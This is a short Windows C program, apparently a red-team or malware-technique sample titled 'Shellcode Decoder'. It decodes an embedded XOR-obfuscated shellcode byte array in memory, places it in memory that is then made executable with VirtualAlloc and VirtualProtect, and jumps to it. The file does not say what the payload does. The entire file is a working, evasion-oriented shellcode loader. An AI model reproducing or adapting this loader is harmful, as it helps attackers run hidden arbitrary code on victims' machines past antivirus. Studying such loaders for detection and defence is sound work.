/*
Title: Shellcode Decoder
*/
#include <Windows.h>

VOID XOR(char* data, size_t dataLen) {
    for (int i = 0; i < dataLen; i++) {
        // We need to reverse operation.
        data[i] ^= 0x34;
        data[i] -= 1;
        data[i] ^= 0x82;
    }
}

int main() {
    // This encoded shellcode was generated with XOR.py
    unsigned char encodedShellcode[] =
        "\x4b\xff\x36\x53\x47\x5f\x77\xb7\xb7\xb7\xf0\xe0"
        "\xf0\xe7\xe5\xe0\xe1\xff\x80\x65\xdc\xff\x3e\xe5"
        "\xd7\xff\x3e\xe5\xaf\xff\x3e\xe5\x97\xff\x3e\xc5"
        "\xe7\xff\xba\x02\xfd\xfd\xe4\x80\x78\xff\x80\x77"
        "\x1b\x8b\xd0\xcb\xb5\x9b\x97\xf0\x70\x78\xa4\xf0"
        "\xb0\x70\x55\x44\xe5\xf0\xe0\xff\x3e\xe5\x97\x3e"
        "\xf5\x8b\xff\xb0\x67\x3e\x37\x3f\xb7\xb7\xb7\xff"
        "\x3c\x77\xc3\xd2\xff\xb0\x67\xe7\x3e\xff\xaf\xf3"
        "\x3e\xf7\x97\xf8\xb0\x67\x56\xe1\xff\x4a\x78\xf0"
        "\x3e\x83\x3f\xff\xb0\x61\xe4\x80\x78\xff\x80\x77"
        "\x1b\xf0\x70\x78\xa4\xf0\xb0\x70\x8f\x57\xcc\x40"
        "\xfb\xb6\xfb\x93\xbf\xfc\x88\x60\xcc\x6f\xef\xf3"
        "\x3e\xf7\x93\xf8\xb0\x67\xd1\xf0\x3e\xbb\xff\xf3"
        "\x3e\xf7\xab\xf8\xb0\x67\xf0\x3e\xb3\x3f\xff\xb0"
        "\x67\xf0\xef\xf0\xef\xe9\xe8\xed\xf0\xef\xf0\xe8"
        "\xf0\xed\xff\x36\x5b\x97\xf0\xe5\x4a\x57\xef\xf0"
        "\xe8\xed\xff\x3e\xa5\x58\xe2\x4a\x4a\x4a\xd4\xff"
        "\x0d\xb0\xb7\xb7\xb7\xb7\xb7\xb7\xb7\xff\x24\x24"
        "\xb0\xb0\xb7\xb7\xf0\x0d\x80\x3e\xda\x32\x4a\x6c"
        "\x0e\x47\x0c\x15\xe1\xf0\x0d\x11\x2c\x74\x14\x4a"
        "\x6c\xff\x36\x73\x9f\x8b\xb1\xcb\xbd\x37\x4e\x57"
        "\xcc\xbc\x0e\xf2\xa6\xc5\xda\xdd\xb7\xe8\xf0\x38"
        "\x6d\x4a\x6c\xd6\xd0\xdb\xd6\x99\xdc\xcf\xdc\xb7"
;

    // Decode the shellcode.
    const size_t shellcodeLen = sizeof(encodedShellcode);
    char shellcode[shellcodeLen] = {};
    memcpy(shellcode, encodedShellcode, shellcodeLen);
    XOR((char*)shellcode, shellcodeLen);

    // -----------------------------------------------------------------------------
    // The following code is the Shellcode Injection example.
    // -----------------------------------------------------------------------------

    LPVOID lpExec = VirtualAlloc(0, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!lpExec) return FALSE;

    memcpy(lpExec, shellcode, sizeof(shellcode));

    DWORD dwOldProtect = 0;
    if (!VirtualProtect(lpExec, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        VirtualFree(lpExec, 0, MEM_RELEASE);
        return FALSE;
    }

    ((void(*)())lpExec)();

	return 0;
}